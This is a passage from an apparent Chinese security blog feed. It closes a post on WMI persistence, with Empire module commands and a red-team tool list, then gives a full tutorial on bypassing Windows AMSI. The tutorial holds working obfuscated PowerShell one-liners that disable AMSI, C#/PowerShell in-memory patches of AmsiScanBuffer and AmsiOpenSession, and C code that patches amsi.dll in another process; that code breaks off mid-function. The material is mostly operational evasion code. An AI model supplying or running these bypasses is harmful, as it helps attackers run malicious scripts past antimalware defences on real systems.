////10.0.0.2//C$ -U pentestlab password</code></p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328202938640.png" alt="image-20220328202938640"></p><p>在 vanilla Windows 10 版本中，系统会记录登录/注销期间的成功和失败尝试。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">auditpol <span class="hljs-regexp">/get /</span>subcategory:Logon<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328203000549.png" alt="image-20220328203000549"></p><h2 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h2><p>PowerShell Empire 有两个模块可以在 WMI 上建立持久性。以下模块可以在特定的每日时间、登录失败期间和启动时 5 分钟内执行有效负载。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">usemodule persistence/elevated/wmi<br><span class="hljs-builtin-name">set</span> Listener WMI<br><span class="hljs-builtin-name">set</span> SubName Empire<br><span class="hljs-builtin-name">set</span> FailedLogon <span class="hljs-literal">True</span><br>execute<br></code></pre></td></tr></table></figure><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328203036419.png" alt="image-20220328203036419"></p><p><strong>与 Metasploit 模块类似，当使用“ FailedLogon</strong> ”选项时，可以使用失败的 SMB 连接来触发基于 PowerShell 的植入。默认情况下，此选项会将两个连接返回到命令和控制服务器。</p><p><img src="/2022/03/28/%E6%8C%81%E4%B9%85%E6%80%A7-WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85/image-20220328203045918.png" alt="image-20220328203045918"></p><p>“ <strong>wmi_updater</strong> ” 模块能够从远程位置获取有效负载，而不是将其存储在 WMI 存储库中。它将注册为“ <strong>AutoUpdater</strong> ”，并且可以在启动时或一天中的特定时间设置触发器。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">usemodule persistence<span class="hljs-regexp">/elevated/</span>wmi_updater*<br></code></pre></td></tr></table></figure><h2 id="工具包"><a href="#工具包" class="headerlink" title="工具包"></a>工具包</h2><p>下表显示了红队可以使用的工具，以实现 WMI 事件订阅的持久性技术以及每个工具的可用触发器选项。</p><table><thead><tr><th><a href="https://www.rapid7.com/db/modules/exploit/windows/local/wmi_persistence">Metasploit</a></th><th>Ruby</th><th>Failed Logon, Process, Startup, Timed</th></tr></thead><tbody><tr><td><a href="https://github.com/BC-SECURITY/Empire">Empire</a></td><td>PowerShell</td><td>Failed Logon, Startup, Timed</td></tr><tr><td><a href="https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Persistence/WMI.cs">SharpSploit</a></td><td>C#</td><td>Process</td></tr><tr><td><a href="https://github.com/mdsecactivebreach/WMIPersistence">WMIPersist</a></td><td>C#</td><td>Process</td></tr><tr><td><a href="https://github.com/nettitude/PoshC2">PoshC2</a></td><td>Python3</td><td>Timed</td></tr><tr><td><a href="https://github.com/jaredhaight/PowerPunch">PowerPunch</a></td><td>PowerShell</td><td>Logon, Startup</td></tr><tr><td><a href="https://github.com/subesp0x10/Wmi-Persistence">Wmi-Persistence</a></td><td>PowerShell</td><td>Logon, Startup, Interval, Timed</td></tr><tr><td><a href="https://github.com/Sw4mpf0x/PowerLurk">PowerLurk</a></td><td>PowerShell</td><td>USB, Logon, Process, Interval, Timed</td></tr><tr><td><a href="https://gist.github.com/infosecn1nja/d9a42a68e9d3671e1fbadee5d7dc8964">WMI-Persistence</a></td><td>PowerShell</td><td>Up-time</td></tr><tr><td><a href="https://github.com/xan7r/Misc">WMILogonBackdoor</a></td><td>PowerShell</td><td>Timed, Interval</td></tr><tr><td><a href="https://github.com/xorrior/RandomPS-Scripts">WMIBackdoor</a></td><td>PowerShell</td><td>Timed, Interval</td></tr><tr><td><a href="https://github.com/n0pe-sled/WMI-Persistence">WMI-Persistence</a></td><td>PowerShell</td><td>Timed</td></tr></tbody></table><p>参考：<a href="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/">https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/</a></p>]]></content>
    
    
    <categories>
      
      <category>WMI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WMI</tag>
      
      <tag>持久性</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bypass-AMSI</title>
    <link href="/2022/03/26/bypass-AMSI/"/>
    <url>/2022/03/26/bypass-AMSI/</url>
    
    <content type="html"><![CDATA[<h2 id="何为AMSI"><a href="#何为AMSI" class="headerlink" title="何为AMSI"></a>何为AMSI</h2><p>Antimalware Scan Interface(AMSI)为反恶意软件扫描接口。</p><p>微软对他产生的目的做出来描述：</p><blockquote><p>Windows 反恶意软件扫描接口 (AMSI) 是一种通用接口标准，允许您的应用程序和服务与机器上存在的任何反恶意软件产品集成。AMSI 为您的最终用户及其数据、应用程序和工作负载提供增强的恶意软件保护。AMSI 与反恶意软件供应商无关；它旨在支持当今可以集成到应用程序中的反恶意软件产品提供的最常见的恶意软件扫描和保护技术。它支持允许文件和内存或流扫描、内容源 URL/IP 信誉检查和其他技术的调用结构。AMSI 还支持会话的概念，以便反恶意软件供应商可以关联不同的扫描请求。例如，可以将恶意负载的不同片段关联起来做出更明智的决定，而仅通过孤立地查看这些片段就很难做出决定。</p></blockquote><p>amsi只是一个通道，真正检测出是否是恶意脚本的是杀软，比如defender，amsi和杀软的区别在于无论我们的恶意脚本是经过多次模糊处理还是远程执行，amsi都可以在脚本注入内存前检测到。而普通的静态杀毒软件是没办法的。</p><p>当用户执行脚本或启动 PowerShell 时，AMSI.dll 被动态加载进入内存空间。在执行之前，防病毒软件使用以下两个 API 来扫描缓冲区和字符串以查找恶意软件的迹象。<br>  AmsiScanBuffer()<br>  AmsiScanString()</p><p>amsi是所有杀毒软件都可以调用吗？并不是！<br>amsi是在Windows 10 和Windows Server 2016 之后才有的，然后并不是所有的杀毒软件都可以调用amsi接口。国内的基本都不可以。</p><p>github上有一个项目记录了可以调用amsi的杀毒软件</p><p><a href="https://github.com/subat0mik/whoamsi/">https://github.com/subat0mik/whoamsi/</a></p><p>在Windows Server 2016和Win10上已经默认安装并启用。他的本体是一个DLL文件，存在于 c:/windows/system32/amsi.dll。<img src="/2022/03/26/bypass-AMSI/image-20220326111424418.png" alt="image-20220326111424418"></p><p>目前AMSI功能已集成到Windows 10的这些组件中</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>用户账户控制，也就是UAC（EXE、COM、MSI、ActiveX的安装） <br>%windir%<span class="hljs-regexp">/System32/</span>consent.exe<br><span class="hljs-number">2.</span>Powershell（脚本、交互式使用、动态代码求值）<br>System.Management.Automation.dll<br><span class="hljs-number">3.</span>Windows脚本宿主<br>    wscript.exe<br>    cscript.exe<br><span class="hljs-number">4.</span>JavaScript、VBScript<br>    %windir%<span class="hljs-regexp">/System32/</span>jscript.dll<br>    %windir%<span class="hljs-regexp">/System32/</span>vbscript.dll<br><span class="hljs-number">5.</span>Office VBA macros(宏)<br>VBE7.dll<br><span class="hljs-number">6</span> .NET Assembly<br>clr.dll<br><span class="hljs-number">7.</span>WMI<br>%windir%<span class="hljs-regexp">/System32/</span>wbem/fastprox.dll<br></code></pre></td></tr></table></figure><h2 id="主流对抗"><a href="#主流对抗" class="headerlink" title="主流对抗"></a>主流对抗</h2><h3 id="1-降级攻击"><a href="#1-降级攻击" class="headerlink" title="1.降级攻击"></a>1.降级攻击</h3><p>因为低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到</p><p>下图是powershell在各个系统上的预装情况，可以看到现在常见的win10、Windows 2016、2019很少预装有powershell2.0（amsi是从win10、2016开始存在的），但是由于很多服务需要低版本的powershell，所以在红蓝对抗中也会碰到装有powershell2.0 的机器。</p><p><img src="/2022/03/26/bypass-AMSI/image-20220326111703209.png" alt="image-20220326111703209"></p><p>查看当前powershell版本</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$PSVersionTable</span></span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/26/bypass-AMSI/image-20220326111803335.png" alt="image-20220326111803335"></p><p>判断能否使用powershell 2.0</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">注：非管理员权限<br><span class="hljs-keyword">Get</span>-ChildItem <span class="hljs-string">&#x27;HKLM:/SOFTWARE/Microsoft/NET Framework Setup/NDP&#x27;</span> -recurse | <span class="hljs-keyword">Get</span>-ItemProperty -<span class="hljs-type">name</span> <span class="hljs-keyword">Version</span> -EA <span class="hljs-number">0</span> | <span class="hljs-keyword">Where</span> &#123; $_.PSChildName -match <span class="hljs-string">&#x27;^(?!S)/p&#123;L&#125;&#x27;</span>&#125; | <span class="hljs-keyword">Select</span> -ExpandProperty <span class="hljs-keyword">Version</span><br><br>注：需要管理员权限<br>Win10：<br><span class="hljs-keyword">Get</span>-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2<br><br>Win2016/Win2019<br><span class="hljs-keyword">Get</span>-WindowsFeature PowerShell-V2<br></code></pre></td></tr></table></figure><p><img src="/2022/03/26/bypass-AMSI/image-20220326111916948.png" alt="image-20220326111916948"></p><p><img src="/2022/03/26/bypass-AMSI/image-20220326111952986.png" alt="image-20220326111952986"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">powershell.exe -version <span class="hljs-number">2</span>   <span class="hljs-regexp">//</span>改变powershell运行版本<br></code></pre></td></tr></table></figure><p><img src="/2022/03/26/bypass-AMSI/image-20220326112155816.png" alt="image-20220326112155816"></p><p>如果在脚本中使用，在脚本开头加入 <code>#requires -version 2</code>，这样如果可以使用2.0，脚本会以2.0执行，如果不能，会按照当前powershell版本执行。当然并不是所有脚本都可以在低版本的powershell执行。</p><p>还有一点，用powershell3 /4/5都还是默认以当前版本的powershell来执行</p><p><img src="/2022/03/26/bypass-AMSI/image-20220326112254528.png" alt="image-20220326112254528"></p><p>另外vbscript/jscript不存在所谓降级攻击，因为在10/16/19并不存在像powershell一样的断代<br>情况</p><h3 id="2-拆分"><a href="#2-拆分" class="headerlink" title="2.拆分"></a>2.拆分</h3><p><img src="/2022/03/26/bypass-AMSI/image-20220326112525445.png" alt="image-20220326112525445"></p><h3 id="3-改注册表禁用AMSI"><a href="#3-改注册表禁用AMSI" class="headerlink" title="3.改注册表禁用AMSI"></a>3.改注册表禁用AMSI</h3><p>设置注册表<code>HKCU/Software/Microsoft/Windows Script/Settings/AmsiEnable</code>设置为 0，以禁用<br>AMSI。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Remove-Item -Path <span class="hljs-string">&quot;HKLM:/Software/Microsoft/Windows Script/Settings/AmsiEnable&quot;</span> -Recurse<br></code></pre></td></tr></table></figure><p>但是，改注册表并不是一种隐秘的方法，并且还需要管理员权限   不怎么适用了</p><h3 id="4-一键关闭AMSI"><a href="#4-一键关闭AMSI" class="headerlink" title="4.一键关闭AMSI"></a>4.一键关闭AMSI</h3><p>使用一行命令关闭amsi，但直接使用肯定是不行的 会被拦</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[Ref]</span><span class="hljs-selector-class">.Assembly</span><span class="hljs-selector-class">.GetType</span>(<span class="hljs-string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>)<span class="hljs-selector-class">.GetField</span>(<span class="hljs-string">&#x27;amsiInitFailed&#x27;</span>,<span class="hljs-string">&#x27;NonPubilc,Static&#x27;</span>)<span class="hljs-selector-class">.SetValue</span>(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/26/bypass-AMSI/image-20220326112749046.png" alt="image-20220326112749046"></p><p>可以一个个试 到底是哪里被杀了</p><p>经过测试发现 <code>AmsiUtils</code>和<code>AmsiInitFailed</code>被杀了</p><p>接下来的思路就很明确了，就是针对<code>AmsiUtils</code>和<code>AmsiInitFailed</code>这两个字符串进行处理了</p><p>和混淆shellcode的方法差不多，先编码再解码</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-comment">//System.Management.Automation.AmsiUtils和amsiInitFailed的编码数据</span><br>$a=<span class="hljs-string">&quot;5492868772801748688168747280728187173688878280688776828&quot;</span><br>$b=<span class="hljs-string">&quot;1173680867656877679866880867644817687416876797271&quot;</span><br><br><span class="hljs-comment">//对System.Management.Automation.AmsiUtils进行解码</span><br>$c=[<span class="hljs-keyword">string</span>](<span class="hljs-number">0.</span><span class="hljs-number">.37</span>|%&#123;[char][<span class="hljs-keyword">int</span>](<span class="hljs-number">29</span>+($a+$b).<span class="hljs-keyword">substring</span>(($_*<span class="hljs-number">2</span>),<span class="hljs-number">2</span>))&#125;)-replace <span class="hljs-string">&quot; &quot;</span><br>$d=[Ref].Assembly.GetType($c)<br><br><span class="hljs-comment">//对amsiInitFailed进行解码</span><br>$e=[<span class="hljs-keyword">string</span>](<span class="hljs-number">38.</span><span class="hljs-number">.51</span>|%&#123;[char][<span class="hljs-keyword">int</span>](<span class="hljs-number">29</span>+($a+$b).<span class="hljs-keyword">substring</span>(($_*<span class="hljs-number">2</span>),<span class="hljs-number">2</span>))&#125;)-replace <span class="hljs-string">&quot; &quot;</span><br>$f=$d.GetField($e,<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>)<br><br><span class="hljs-comment">//组合起来执行</span><br>$f.SetValue($null,$true)<br></code></pre></td></tr></table></figure><p><img src="/2022/03/26/bypass-AMSI/image-20220326113041308.png" alt="image-20220326113041308"></p><p>混淆的关键点就是 编码解码 <code>[string](0..37|%&#123;[char][int](29+($a+$b).substring(($_*2),2))&#125;)-replace &quot; &quot;</code></p><p>hex编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">[Ref].Assembly.GetType(<span class="hljs-string">&#x27;System.Management.Automation.&#x27;</span>+$(<span class="hljs-string">&quot;41 6D 73 69 55 74 69 6C 73&quot;</span>.Split(<span class="hljs-string">&quot; &quot;</span>)|<span class="hljs-keyword">forEach</span>&#123;[char]([convert]::toint16(<span class="hljs-variable">$_</span>,<span class="hljs-number">16</span>))&#125;|<span class="hljs-keyword">forEach</span>&#123;<span class="hljs-variable">$result</span>=<span class="hljs-variable">$result</span>+<span class="hljs-variable">$_</span>&#125;;<span class="hljs-variable">$result</span>)).GetField($(<span class="hljs-string">&quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&quot;</span>.Split(<span class="hljs-string">&quot; &quot;</span>)|<span class="hljs-keyword">forEach</span>&#123;[char]([convert]::toint16(<span class="hljs-variable">$_</span>,<span class="hljs-number">16</span>))&#125;|<span class="hljs-keyword">forEach</span>&#123;<span class="hljs-variable">$result2</span>=<span class="hljs-variable">$result2</span>+<span class="hljs-variable">$_</span>&#125;;<span class="hljs-variable">$result2</span>),<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure><p> base64亲测失效，虽然可以关掉amsi，但被defender查杀，会立刻结束掉当前powershell进程</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[Ref]</span><span class="hljs-selector-class">.Assembly</span><span class="hljs-selector-class">.GetType</span>(<span class="hljs-string">&#x27;System.Management.Automation.&#x27;</span>+$(<span class="hljs-selector-attr">[Text.Encoding]</span>::Unicode<span class="hljs-selector-class">.GetString</span>(<span class="hljs-selector-attr">[Convert]</span>::FromBase64String(<span class="hljs-string">&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;</span>))))<span class="hljs-selector-class">.GetField</span>($(<span class="hljs-selector-attr">[Text.Encoding]</span>::Unicode<span class="hljs-selector-class">.GetString</span>(<span class="hljs-selector-attr">[Convert]</span>::FromBase64String(<span class="hljs-string">&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;</span>))),<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>)<span class="hljs-selector-class">.SetValue</span>(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure><p>更多的混淆办法去学习下powershell，了解语言本身</p><p>可参考：<a href="https://mp.weixin.qq.com/s/Sg0LK8emSWP1m-yds4VGrQ">https://mp.weixin.qq.com/s/Sg0LK8emSWP1m-yds4VGrQ</a></p><h3 id="5-内存补丁"><a href="#5-内存补丁" class="headerlink" title="5.内存补丁"></a>5.内存补丁</h3><p>AMSI检测相关api的调用顺序</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">AmsiInitialize – 初始化AMSI API.<br>AmsiOpenSession – 打开<span class="hljs-keyword">session</span><br>AmsiScanBuffer – scans the <span class="hljs-keyword">user</span>-<span class="hljs-keyword">input</span>.<br>AmsiCloseSession – 关闭<span class="hljs-keyword">session</span><br>AmsiUninitialize – 删除AMSI API<br></code></pre></td></tr></table></figure><p>因为amsi是基于字符串静态扫描的，用到的函数是 <code>AmsiScanBuffer</code>，我们是不是可以hook该函数，使其返回我们需要的值呢？理则是修改AmsiScanBuffer函数的参数值（两个思路，一个是修改扫描长度，另一个是修改返回值）</p><p>看下<code>AmsiScanBuffer</code>的函数参数</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">HRESULT AmsiScanBuffer( <br>HAMSICONTEXT amsiContext,<br> PVOID buffer,<br> ULONG <span class="hljs-built_in">length</span>,<br> LPCWSTR contentName,<br> HAMSISESSION amsiSession,<br> AMSI_RESULT *<span class="hljs-literal">result</span> );<br></code></pre></td></tr></table></figure><p>为了让amsi.dll 返回 <code>AMSI_RESULT_NOT_DETECTED</code>，这里的关注点是 <code>hResult</code>，即amsi.dll的返回值，只要它小于0，就可以bypass amsi。通过分析我们可以在<code>AmsiInitialize、AmsiOpenSession、AmsiScanBuffer</code>这3个函数中patch(补丁)都可以达到bypass amsi的效果.</p><p>分析后，<code>AmsiInitializ</code>不可以利用，<code>AmsiOpenSession、AmsiScanBuffer</code>可以利用</p><p>demo1</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-variable">$p</span>=@&quot;<br>using System;<br>using System.Linq;<br>using System.Runtime.InteropServices;<br>public <span class="hljs-keyword">class</span> <span class="hljs-keyword">Program</span><br>&#123;<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr LoadLibrary(string name);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,<br>uint flNewProtect, <span class="hljs-keyword">out</span> uint lpfloldProtect);<br>public static void Bypass()<br>&#123;<br>String a =<br><span class="hljs-string">&quot;isma&quot;</span>;<br>String b =<br><span class="hljs-string">&quot;reffuBnacSismA&quot;</span>;<br>IntPtr lib = LoadLibrary(String.Join(<span class="hljs-string">&quot;&quot;</span><br>, a.<span class="hljs-built_in">Reverse</span>().ToArray()) +<br>&quot;<br>.dll&quot;);<br>IntPtr addr = GetProcAddress(lib, String.Join(<span class="hljs-string">&quot;&quot;</span><br>,<br>b.<span class="hljs-built_in">Reverse</span>().ToArray()));<br>uint old = 0;<br>byte[] p;<br>p = new byte[6];<br>p[0] = 0xB8;<br>p[1] = 0x57;<br>p[2] = 0x00;<br>p[3] = 0x07;<br>p[4] = 0x80;<br>p[5] = 0xc3;<br>VirtualProtect(addr, (UIntPtr)p.Length, 0x04, <span class="hljs-keyword">out</span> old);<br>Marshal.<span class="hljs-keyword">Copy</span>(p, 0, addr, p.Length);<br>VirtualProtect(addr, (UIntPtr)p.Length, old, <span class="hljs-keyword">out</span> old);<br>&#125;<br>&#125;<br>&quot;@<br>Add-<span class="hljs-keyword">Type</span> <span class="hljs-variable">$p</span><br>[<span class="hljs-keyword">Program</span>]::Bypass()<br></code></pre></td></tr></table></figure><p>这段码的功能就是在<code>AmsiScanBuffer</code>的函数地址处直接打补丁，补丁汇编是：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x80070057</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p><code>0x80070057</code>也就是<code>-2147024809</code>，是一个负数，当然也可以是其他负数，而<code>AmsiScanBuffer</code>也可以修<br>改成<code>AmsiOpenSession</code>。怎么把汇编代码转换成代码中的数组呢？使用<a href="https://defuse.ca/online-x86-assembler.htm#disassembly%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%BE%88%E5%BF%AB%E8%BD%AC%E6%8D%A2%E3%80%82%E6%88%91%E4%BB%AC%E6%9D%A5%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%E4%B8%8B%EF%BC%9A">https://defuse.ca/online-x86-assembler.htm#disassembly，可以很快转换。我们来修改代码测试下：</a></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-variable">$p</span>=@&quot;<br>using System;<br>using System.Linq;<br>using System.Runtime.InteropServices;<br>public <span class="hljs-keyword">class</span> <span class="hljs-keyword">Program</span><br>&#123;<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr LoadLibrary(string name);<br>[DllImport(<span class="hljs-string">&quot;kernel32&quot;</span>)]<br>public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,<br>uint flNewProtect, <span class="hljs-keyword">out</span> uint lpfloldProtect);<br>public static void Bypass()<br>&#123;<br>String a =<br><span class="hljs-string">&quot;isma&quot;</span>;<br>IntPtr lib = LoadLibrary(String.Join(<span class="hljs-string">&quot;&quot;</span><br>, a.<span class="hljs-built_in">Reverse</span>().ToArray()) +<br>&quot;<br>.dll&quot;);<br>IntPtr addr = GetProcAddress(lib,<br><span class="hljs-string">&quot;AmsiOpenSession&quot;</span>);<br>uint old = 0;<br>byte[] p;<br>p = new byte[6];<br>p[0] = 0xB8;<br>p[1] = 0xFF;<br>p[2] = 0xFF;<br>p[3] = 0xFF;<br>p[4] = 0xFF;<br>p[5] = 0xC3;<br>VirtualProtect(addr, (UIntPtr)p.Length, 0x04, <span class="hljs-keyword">out</span> old);<br>Marshal.<span class="hljs-keyword">Copy</span>(p, 0, addr, p.Length);<br>VirtualProtect(addr, (UIntPtr)p.Length, old, <span class="hljs-keyword">out</span> old);<br>&#125;<br>&#125;<br>&quot;@<br>Add-<span class="hljs-keyword">Type</span> <span class="hljs-variable">$p</span><br>[<span class="hljs-keyword">Program</span>]::Bypass()<br></code></pre></td></tr></table></figure><p>我们修改了被打补丁的函数为AmsiOpenSession,补丁汇编代码为:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>,-<span class="hljs-number">1</span><br><span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>我们知道了补丁函数可以为AmsiOpenSession、AmsiScanBuffer，补丁代码可以变化很<br>多，只要返回结果为负数就行。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">#<span class="hljs-keyword">include</span> &lt;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Windows</span>.</span></span>h&gt;<br>#<span class="hljs-keyword">include</span> &lt;stdio.h&gt;<br><br><span class="hljs-built_in">int</span> main<span class="hljs-literal">()</span> &#123;<br>    STARTUPINFOA si = &#123; <span class="hljs-number">0</span> &#125;;<br>    PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>    si.cb = sizeof(si);<br><br>    <span class="hljs-constructor">CreateProcessA(NULL, (LPSTR)</span><span class="hljs-string">&quot;powershell -NoExit dir&quot;</span>, NULL, NULL, NULL, NULL, NULL, NULL, &amp;si, &amp;pi);<br><br>    HMODULE hAmsi = <span class="hljs-constructor">LoadLibraryA(<span class="hljs-string">&quot;amsi.dll&quot;</span>)</span>;<br>    LPVOID pAmsiScanBuffer = <span class="hljs-constructor">GetProcAddress(<span class="hljs-params">hAmsi</span>, <span class="hljs-string">&quot;AmsiScanBuffer&quot;</span>)</span>;<br><br>    <span class="hljs-constructor">Sleep(500)</span>;<br><br>    DWORD oldProtect;<br>    <span class="hljs-built_in">char</span> patch = <span class="hljs-number">0xc3</span>;<br><br>    <span class="hljs-constructor">VirtualProtectEx(<span class="hljs-params">pi</span>.<span class="hljs-params">hProcess</span>, (LPVOID)</span>pAmsiScanBuffer, <span class="hljs-number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br>    